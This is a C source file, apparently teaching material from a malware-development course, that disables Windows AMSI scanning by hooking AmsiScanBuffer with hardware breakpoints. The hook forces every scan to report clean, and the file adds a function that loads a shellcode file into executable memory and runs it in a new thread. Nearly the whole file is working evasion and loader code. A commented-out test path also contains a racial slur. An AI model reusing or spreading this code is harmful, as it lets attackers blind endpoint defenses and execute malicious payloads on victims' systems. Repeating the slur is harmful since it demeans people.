// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <amsi.h>
#include <stdio.h>
#include "HardwareBreakPoints.h"


VOID AmsiScanBufferDetour(PCONTEXT pThreadCtx) {

	printf("[+] AmsiScanBuffer Call Intercepted \n");

	AMSI_RESULT* Result = (AMSI_RESULT*)GETPARM_6(pThreadCtx);

	*Result = AMSI_RESULT_CLEAN;

	BLOCK_REAL(pThreadCtx);

	CONTINUE_EXECUTION(pThreadCtx);
}


BOOL InjectShellcodeFileLocally(IN LPCWSTR wsShellFileName) {

	HANDLE	hFile					= INVALID_HANDLE_VALUE,
			hThread					= NULL;
	DWORD	dwBufferSize			= NULL,
			dwNumberOfBytesRead		= NULL,
			dwOldProtection			= NULL;
	PBYTE	pBufferData				= NULL;
	DWORD	dwThreadId				= 0x00;
	BOOL	bResults				= FALSE;


	if ((hFile = CreateFileW(wsShellFileName, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	if ((dwBufferSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		printf("[!] GetFileSize Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	if ((pBufferData = VirtualAlloc(NULL, dwBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) == NULL) {
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	if (!ReadFile(hFile, pBufferData, dwBufferSize, &dwNumberOfBytesRead, NULL) || dwNumberOfBytesRead != dwBufferSize) {
		printf("[!] ReadFile Failed With Error : %d \n", GetLastError());
		printf("[!] Bytes Read: %d of %d\n", dwNumberOfBytesRead, dwBufferSize);
		goto _EndOfFunc;
	}

	if (!VirtualProtect(pBufferData, dwBufferSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	printf("\t> Running Payload Via Thread ");
	hThread = CreateThread(NULL, NULL, pBufferData, NULL, NULL, &dwThreadId);
	printf("[ %d ] ... \n", dwThreadId);
	if (hThread)
		WaitForSingleObject(hThread, INFINITE);

	bResults = TRUE;

_EndOfFunc:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	return bResults;
}



int main() {

	PVOID	pAmsiScanBuffer		= NULL;

	if (!LoadLibrary(TEXT("AMSI"))) {
		printf("[!] LoadLibrary Failed With Error: %d \n", GetLastError());
		return -1;
	}

	if (!(pAmsiScanBuffer = GetProcAddress(GetModuleHandle(TEXT("AMSI")), "AmsiScanBuffer"))) {
		printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
		return -1;
	}
	

	if (!InitHardwareBreakpointHooking())
		return -1;

	printf("[i] Installing Hooks ... ");

	if (!InstallHardwareBreakingPntHook(pAmsiScanBuffer, Dr0, AmsiScanBufferDetour, ALL_THREADS))
		return -1;
	printf("[+] DONE \n");


	printf("[i] Installing The Same Hooks On New Threads ... ");

	if (!InstallHooksOnNewThreads(Dr1))
		return -1;
	printf("[+] DONE \n");


	// TESTING
	/*
	if (!InjectShellcodeFileLocally(L"C:\\nigga.amsi.test.bin"))
		return -1;
	*/

	printf("[#] Press <Enter> To Cleanup And Exit ... \n");
	getchar();

	if (!CleapUpHardwareBreakpointHooking())
		return -1;

	return 0;
}